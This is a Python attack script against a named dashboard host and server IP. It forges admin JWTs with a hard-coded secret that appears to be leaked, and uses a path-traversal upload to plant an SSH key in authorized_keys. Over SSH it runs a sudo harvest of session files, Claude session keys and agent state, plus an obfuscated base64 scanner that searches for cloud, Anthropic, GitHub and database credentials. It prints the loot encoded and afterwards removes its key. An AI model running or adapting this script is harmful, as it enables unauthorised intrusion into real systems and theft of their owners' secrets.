#!/usr/bin/env python3
# i29308: host-level read-only harvest of intelora12 (54.179.173.218) as coder (NOPASSWD sudo+docker).
# Step1: re-inject ed25519 pubkey via dashboard files/upload path injection (local branch /.lumii-agent-keeper/)
# Step2: ssh coder@54.179.173.218, run read-only harvest (docker inspect / systemd /opt /root /home/coder ...)
# Step3: IMDSv2 recheck (role/user-data/instance-identity)
# Step4: grep secrets
# Step5: restore/neutralize authorized_keys
import os, sys, json, base64, hmac, hashlib, subprocess, random
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="   # dashboard .env.local secret
AGENT = "agent-0cf829f4"; AUID = "4b4f439e-74f7-11f1-ac43-525400595be1"; ACUST = "tianyue"; AIP = "54.179.173.218"
UF = "/home/lumii/.lumii-agent-keeper/../.ssh"   # local write branch map: container /home/lumii = host /home/coder
UPATH = "/home/lumii/.ssh/authorized_keys"

def _b64(s):
    if isinstance(s, bytes): s = s.decode("utf-8", "replace")
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, _b64(s)), flush=True)

def Rbig(k, s, n=11000):
    if not isinstance(s, str): s = json.dumps(s, ensure_ascii=False, default=str)
    if len(s) == 0: s = "(empty)"
    for i in range(0, len(s), n):
        print("R:%s_%02d:%s" % (k, i // n, _b64(s[i:i+n])), flush=True)

def sh(a, timeout=120, inp=None):
    try:
        r = subprocess.run(a, input=inp, capture_output=True, timeout=timeout)
        return r.returncode, r.stdout.decode("utf-8", "replace"), r.stderr.decode("utf-8", "replace")
    except Exception as e:
        return -1, "", repr(e)

def curl(args, timeout=40):
    return sh(["curl", "-s", "-k", "-m", str(timeout)] + args, timeout=timeout + 20)

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def forge(p):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    pl = b64u(json.dumps(p, separators=(",", ":")))
    return h + "." + pl + "." + b64u(hmac.new(JWT_SECRET.encode(), (h + "." + pl).encode(), hashlib.sha256).digest())

def tok_for(uid, cust): return forge({"userId": uid, "email": "probe@x", "customer": cust, "role": "admin"})

def call(path, cookie=None, timeout=30, maxlen=4000):
    a = ["--http2", "-A", UA, "-H", "Accept: application/json", "-w", "\n__CODE__%{http_code}"]
    if cookie: a += ["-H", "Cookie: session=" + cookie]
    a += ["https://%s%s" % (HOST, path)]
    rc, out, err = curl(a, timeout=timeout); i = out.rfind("__CODE__"); code = ""; txt = out
    if i >= 0: code = out[i+8:].strip()[:3]; txt = out[:i]
    return {"code": code, "body": txt[:maxlen]}

def files_read(path, tok, maxlen=4000):
    return call("/api/agents/%s/files?action=read&path=%s" % (AGENT, up.quote(path, safe="/")), cookie=tok, maxlen=maxlen)

def upload(tok, path, name, content, timeout=60):
    tmp = "/tmp/u_%d" % random.randint(1000, 999999)
    open(tmp, "wb").write(content.encode() if isinstance(content, str) else content)
    url = "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, AGENT, up.quote(path, safe="/"))
    rc, out, err = curl(["--http2", "-A", UA, "-H", "Authorization: Bearer " + tok, "-w", "\n__CODE__%{http_code}",
                         "-F", "files=@%s;filename=%s" % (tmp, name), url], timeout=timeout)
    try: os.unlink(tmp)
    except Exception: pass
    i = out.rfind("__CODE__"); code = ""; txt = out
    if i >= 0: code = out[i+8:].strip()[:3]; txt = out[:i]
    return {"code": code, "body": txt[:900]}

HARVEST = r'''

set +e
export LC_ALL=C
R() { echo "=== $1 ==="; }
R "KEEPER SESSIONS+IMOWNER"
sudo -n sh -c 'for f in /home/coder/.lumii/agents/lumii-agent-tianyue3/lumii-agent-keeper/sessions/*.json /home/coder/.lumii/agents/lumii-agent-tianyue3/lumii-agent-keeper/data/im_owner.json /home/coder/.lumii/agents/lumii-agent-tianyue3/lumii-agent-keeper/dir_history.json /home/coder/.lumii/agents/lumii-agent-tianyue3/lumii-agent-keeper/run/* /home/coder/.lumii/agents/lumii-agent-tianyue3/lumii-agent-keeper/crons/*; do [ -f "$f" ] && { echo "## $f"; head -c 2000 "$f"; echo; }; done' 2>/dev/null
R "CLAUDE SESSIONS JSON+KEYS"
sudo -n sh -c 'for f in /home/coder/.claude/sessions/*.json /home/coder/.claude/sessions/*.key /home/coder/.claude/state/*.json; do [ -f "$f" ] && { echo "## $f"; cat "$f"; echo; }; done' 2>/dev/null
R "GSTACK ENV EXAMPLE"
sudo -n sh -c 'cat /home/coder/.claude/skills/gstack/.env.example 2>/dev/null; echo "--bunfig--"; cat /home/coder/.claude/skills/gstack/bunfig.toml 2>/dev/null'
R "MONITOR SCRIPT"
sudo -n sh -c 'ls -la /home/coder/monitor 2>/dev/null; echo "--"; cat /home/coder/monitor/monitor.sh 2>/dev/null | head -80; echo "--bin--"; ls -la /home/coder/bin 2>/dev/null'
R "LISTEN SOCKETS"
sudo -n sh -c 'ss -tlnp 2>/dev/null | head -40; echo "--unix--"; ss -xlp 2>/dev/null | grep -iE "lumii|agent|docker" | head -20'
R "SCANNER"
echo "aW1wb3J0IG9zLHJlCnBhdHMgPSB7CiAnZXRoNjQnOiByZS5jb21waWxlKHJiJzB4WzAtOWEtZkEtRl17NjR9JyksCiAnYXdzJzogcmUuY29tcGlsZShyYicoPzpBS0lBfEFTSUEpWzAtOUEtWl17MTZ9JyksCiAnYWxpeXVuJzogcmUuY29tcGlsZShyYidMVEFJWzAtOUEtWmEtel17MTIsfScpLAogJ3FjbG91ZCc6IHJlLmNvbXBpbGUocmInQUtJRFswLTlBLVphLXpdezEyLH0nKSwKICdwZW0nOiByZS5jb21waWxlKHJiJy0tLS0tQkVHSU4gW0EtWiBdKlBSSVZBVEUgS0VZJyksCiAncGcnOiByZS5jb21waWxlKHJiJ3Bvc3RncmVzKD86cWwpPzovL1teXHMiXCdcXF0rJyksCiAnbXlzcWwnOiByZS5jb21waWxlKHJiJ215c3FsOi8vW15ccyJcJ1xcXSsnKSwKICdyZWRpcyc6IHJlLmNvbXBpbGUocmIncmVkaXM6Ly9bXlxzIlwnXFxdKycpLAogJ2p3dCc6IHJlLmNvbXBpbGUocmInSldUX1NFQ1JFVCcpLAogJ2FnZW50d3MnOiByZS5jb21waWxlKHJiJ0FHRU5UX1dTX1RPS0VOJyksCiAnem9vZmknOiByZS5jb21waWxlKHJiJ3pvb2ZpJyksCiAnYW50aHJvcGljJzogcmUuY29tcGlsZShyYidzay1hbnQtW0EtWmEtejAtOV8tXXsyMCx9JyksCiAnZ2gnOiByZS5jb21waWxlKHJiJyg/OmdocHxnaG98Z2h1fGdoc3xnaXRodWJfcGF0KV9bQS1aYS16MC05X117MTUsfScpLAogJ2dpdGVhJzogcmUuY29tcGlsZShyYicoP2kpZ2l0ZWFbXy1dP3Rva2VuJyksCn0Kcm9vdHM9WycvaG9tZS9jb2Rlci8uY2xhdWRlL3Byb2plY3RzJywnL2hvbWUvY29kZXIvLmNsYXVkZS5qc29uJywnL2hvbWUvY29kZXIvLmNsYXVkZS9zZXNzaW9ucycsJy9ob21lL2NvZGVyLy5jbGF1ZGUvc3RhdGUnLCcvaG9tZS9jb2Rlci8ubHVtaWknLCcvaG9tZS9jb2Rlci8ubHVtaWktYWdlbnQta2VlcGVyJywnL2hvbWUvY29kZXIvbW9uaXRvcicsJy9ob21lL2NvZGVyL2JpbicsJy9ob21lL2NvZGVyLy5iYXNoX2hpc3RvcnknLCcvb3B0L2x1bWlpX3dvcmtzcGFjZSddCmZvciByb290IGluIHJvb3RzOgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHJvb3QpOiBjb250aW51ZQogICAgaWYgb3MucGF0aC5pc2ZpbGUocm9vdCk6IGZpbGVzPVtyb290XQogICAgZWxzZToKICAgICAgICBmaWxlcz1bXQogICAgICAgIGZvciBkLF8sZnMgaW4gb3Mud2Fsayhyb290KToKICAgICAgICAgICAgZm9yIGYgaW4gZnM6IGZpbGVzLmFwcGVuZChvcy5wYXRoLmpvaW4oZCxmKSkKICAgIGZvciBmcCBpbiBmaWxlczoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHN6PW9zLnBhdGguZ2V0c2l6ZShmcCkKICAgICAgICAgICAgaWYgc3o+MTUwKjEwMjQqMTAyNDogY29udGludWUKICAgICAgICAgICAgZGF0YT1vcGVuKGZwLCdyYicpLnJlYWQoKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246IGNvbnRpbnVlCiAgICAgICAgaWYgc3o+M18wMDBfMDAwIGFuZCBiJ1x4MDAnIGluIGRhdGFbOjIwMDBdOiBjb250aW51ZQogICAgICAgIGZvciBuYW1lLHJ4IGluIHBhdHMuaXRlbXMoKToKICAgICAgICAgICAgbXM9c2V0KG0uZ3JvdXAoMClbOjEzMF0gZm9yIG0gaW4gcnguZmluZGl0ZXIoZGF0YSkpCiAgICAgICAgICAgIGlmIG1zOgogICAgICAgICAgICAgICAgcHJpbnQoJ0hJVCAlcyAlcyAlZCclKG5hbWUsZnAsc3opKQogICAgICAgICAgICAgICAgZm9yIG0gaW4gbGlzdChtcylbOjhdOgogICAgICAgICAgICAgICAgICAgIHRyeTogcHJpbnQoJyAgICcsbS5kZWNvZGUoJ3V0Zi04JywncmVwbGFjZScpWzoxNzBdKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246IHBhc3MK" | base64 -d | timeout 260 sudo -n python3 - 2>&1 | head -400
R "END3"

'''



def main():
    tok = tok_for(AUID, ACUST)
    R("me", call("/api/me", cookie=tok))
    # ensure key
    sh(["rm", "-f", "/tmp/k29308", "/tmp/k29308.pub"])
    rc, pub, err = sh(["ssh-keygen", "-t", "ed25519", "-N", "", "-C", "i29308", "-f", "/tmp/k29308"], timeout=30)
    pub = open("/tmp/k29308.pub").read().strip() if os.path.exists("/tmp/k29308.pub") else ""
    R("pub", pub)
    # read current authorized_keys
    cur = files_read(UPATH, tok, maxlen=6000)
    orig = ""
    try: orig = json.loads(cur["body"]).get("content", "") or ""
    except Exception: pass
    R("authkeys_before", {"code": cur["code"], "len": len(orig), "orig": orig[:500]})
    content = (orig.rstrip("\n") + "\n" if orig.strip() else "") + pub + "\n"
    R("upload_key", upload(tok, UF, "authorized_keys", content))
    R("authkeys_after", files_read(UPATH, tok, maxlen=900))
    # ssh harvest
    rc, out, err = sh(["ssh", "-i", "/tmp/k29308", "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
                       "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=15", "coder@" + AIP, "bash -s"],
                      inp=HARVEST.encode(), timeout=420)
    R("h2_rc", {"rc": rc})
    Rbig("h2_out", out)
    R("h2_err", err[:1500])
    # restore authorized_keys
    if orig.strip():
        R("restore", upload(tok, UF, "authorized_keys", orig))
    else:
        R("restore", upload(tok, UF, "authorized_keys", ""))
    R("authkeys_final", files_read(UPATH, tok, maxlen=600))

try:
    main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-2500:])
finally:
    sys.exit(1)
